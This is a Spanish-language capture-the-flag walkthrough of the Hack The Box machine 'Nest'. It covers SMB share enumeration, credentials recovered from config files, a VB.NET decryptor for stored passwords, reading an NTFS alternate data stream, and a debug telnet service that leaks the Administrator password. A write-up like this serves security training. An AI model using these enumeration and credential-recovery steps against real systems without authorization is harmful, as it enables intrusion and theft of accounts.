
- Maquina: Windows
- Level: Easy
- IP: 10.10.10.178

## Herramientas a utilizar:

- nmap
- smbclient 
- smbget

```
nmap -sC -sV -o scan_nest.txt 10.10.10.178
```
Podemos verificar que esta maquina tiene SMB abierto.
|PORT|STATE SERVICE|VERSION|
|---|---|---|
|445/tcp| open | microsoft-ds?
>Host script results:
|_clock-skew: 1m32s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required


El cual podemos enumerar con y verificar los share disponible
```
smbclient -L \\\\10.10.10.178 
```

Utilizaremos el share `data` por que puede ser accedido sin credenciales.
```
smbclient \\\\10.10.10.178\\Data
smb: \> recurse on 
smb: \> ls
smb: \> cd Shared\Templates\HR\
smb: \> cd \Shared\Templates\HR\> ls
```

Aqui encontraremo un archivo el cual descargaremos a nuestra maquina para posterior revision.
```
smb: \> mget "Welcom Email.txt"
```

Luego iremos a siguiente directorio:
```
smb: \> cd ../../Maintenance\
```
Tambien descargaremos `Maintenance Alerts.txt` para su posterior revision.
```
smb: \Shared\Maintenance\> mget "Maintenance Alerts.txt"
```

>Al abrir el archivo: Maintenance Alerts.txt encontraremos lo siguiente:
Username: TempUser
Password: welcome2019

Ahora tenemos las credenciales del usuario TempUser.
```
smbclient \\\\10.10.10.178\\Data -U TempUser
smb: \> recurse on
smb: \> ls
```

Ahora al listar veremos el directorio de TI por lo cual descargaremos todos directorio TI.
```
smbget -R smb://10.10.10.178/Data/ -U TempUser
```
Bucando entre todo el contenido descargado veremos dos archivo my peculiares
`RU_Config.xml`
`config.xml`
```
Data//IT/Configs/RU Scanner/RU_Config.xml
```
En el archivo `RU_Config.xml` veremos:
> <?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
 <Port>389</Port>
 **<Username>c.smith</Username>**
 **<Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>**
</ConfigFile>

En el archivo `config.xml` veremos:
```
Data//IT/Configs/NotepadPlusPlus/config.xml
```

><?xml version="1.0" encoding="Windows-1252" ?>
<NotepadPlus>
[SNIP]
 <History nbMaxFile="15" inSubMenu="no" customLength="-1">
 <File filename="C:\windows\System32\drivers\etc\hosts" />
 <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
 <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
 </History>
</NotepadPlus>

Aqui al parecer podemos alguien estaba accediendo al archivo en el recurso compartido **Secure$**
así como tambien al archivos en el escritorio del usuario de **C.Smith.**

Verificamos si podemos acceder **Secure$** como TempUser:

```
smbclient \\\\10.10.10.178\\Secure$ -U TempUser
```
Pero con el usuario TempUser no tenemos acceso pero si directamente en `IT\Carl\`
```
smbget -rR smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
```
En este directorio encontramos dos archivo `Module1.vb` and `Utils.vb`
>Que despues de muchas vuelta he caido encuenta que estos archivos los puedo utilizar para descryptar el password encontrado en el archivo `RU_config.xml`.

Pero para lograr hacerlo debo unificar ambos archivos y en 
```
https://dotnetfiddle.net
```
El contenido del archivo seria:
```
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils
	Public Class ConfigFile
 Public Property Port As Integer
 Public Property Username As String
 Public Property Password As String

 Public Sub SaveToFile(Path As String)
 Using File As New System.IO.FileStream(Path, System.IO.FileMode.Create)
 Dim Writer As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
 Writer.Serialize(File, Me)
 End Using
 End Sub

 Public Shared Function LoadFromFile(ByVal FilePath As String) As ConfigFile
 Using File As New System.IO.FileStream(FilePath, System.IO.FileMode.Open)
 Dim Reader As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
 Return DirectCast(Reader.Deserialize(File), ConfigFile)
 End Using
 End Function
 
End Class
 Public Shared Function DecryptString(EncryptedString As String) As String
 If String.IsNullOrEmpty(EncryptedString) Then
 Return String.Empty
 Else
 Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
 End If
 End Function

 Public Shared Function Decrypt(ByVal cipherText As String, _
 ByVal passPhrase As String, _
 ByVal saltValue As String, _
 ByVal passwordIterations As Integer, _
 ByVal initVector As String, _
 ByVal keySize As Integer) _
 As String
 Dim initVectorBytes As Byte()
 initVectorBytes = Encoding.ASCII.GetBytes(initVector)
 Dim saltValueBytes As Byte()
 saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
 Dim cipherTextBytes As Byte()
 cipherTextBytes = System.Convert.FromBase64String(cipherText)
 Dim password As New Rfc2898DeriveBytes(passPhrase, _
 saltValueBytes, _
 passwordIterations)
 Dim keyBytes As Byte()
 keyBytes = password.GetBytes(CInt(keySize / 8))
 Dim symmetricKey As New AesCryptoServiceProvider
 symmetricKey.Mode = CipherMode.CBC
 Dim decryptor As ICryptoTransform
 decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
 Dim memoryStream As System.IO.MemoryStream
 memoryStream = New System.IO.MemoryStream(cipherTextBytes)
 Dim cryptoStream As CryptoStream
 cryptoStream = New CryptoStream(memoryStream, _
 decryptor, _
 CryptoStreamMode.Read)
 Dim plainTextBytes As Byte()
 ReDim plainTextBytes(cipherTextBytes.Length)
 Dim decryptedByteCount As Integer
 decryptedByteCount = cryptoStream.Read(plainTextBytes, _
 0, _
 plainTextBytes.Length)
 memoryStream.Close()
 cryptoStream.Close()
 Dim plainText As String
 plainText = Encoding.ASCII.GetString(plainTextBytes, _
 0, _
 decryptedByteCount)
	System.Console.WriteLine(plainText)
	Return plainText
 End Function

Public Class SsoIntegration
 Public Property Username As String
 Public Property Password As String
End Class

 Sub Main()
 Dim test As New SsoIntegration With {.Username = "c.smith", .Password = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")}
 End Sub
End Class
```

Con este codigo podemos tener el password del usuario `C.Smith`
**password: xRxRxPANCAK3SxRxRx**

Ahora probaremos con el usuario y clave encontrado
```
smbclient \\\\10.10.10.178\\Users -U C.Smith
cd C.Smith
get user.txt
```
Listo no fue nada facil, pero ya tenemos la primera flag 👏

Ahora a por el root donde en el siguiente directorio
 `C.Smith\HQK Reporting` 
 Veremos dos archivos
 `Debug Mode Password.txt` y `Debug Mode Password.txt:Password`

Veremos el archivo `debug mode password.txt:password` este archivo en particular tiene un formato **File-Streams** que investigando me encontre que:
https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams

>Es una secuencia de bytes. En el sistema de archivos NTFS, las secuencias contienen los datos que se escriben en un archivo y que brindan más información sobre un archivo que los atributos y propiedades. Por ejemplo, puede crear una secuencia que contenga palabras clave de búsqueda o la identidad de la cuenta de usuario que crea un archivo.

```
more "Debug Mode Password.txt:Password"
```
Y en este tenemos un password:
**PASSWORD DEBUG: WBQ201953D8w**

Hacemos un telnet por el puerto 4386
```
telnet 10.10.10.178 4386
DEBUG WBQ201953D8w 
setdir ..
setdir LDAP
showquery 2
Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```
Aqui encontramos un password y utilizaremos la siguiente web en la cual encontramos un codigo que copiaremos.
https://pastebin.com/RfZhBcq9


Luego debemos ir a:
https://dotnetfiddle.net/Z9MZYl 

Pegamos el codigo encontrado parametrizar lo siguiente
`Language: C#`
`Compiler: .net 4.7.2`

Ejecutamos y el resultado sera:
The magical rootdance key is:
XtH4nkS4Pl4y1nGX

```
smbclient \\\\10.10.10.178\\c$ -U Administrator
cd \Users\Administrator\Desktop\
more root.txt
```

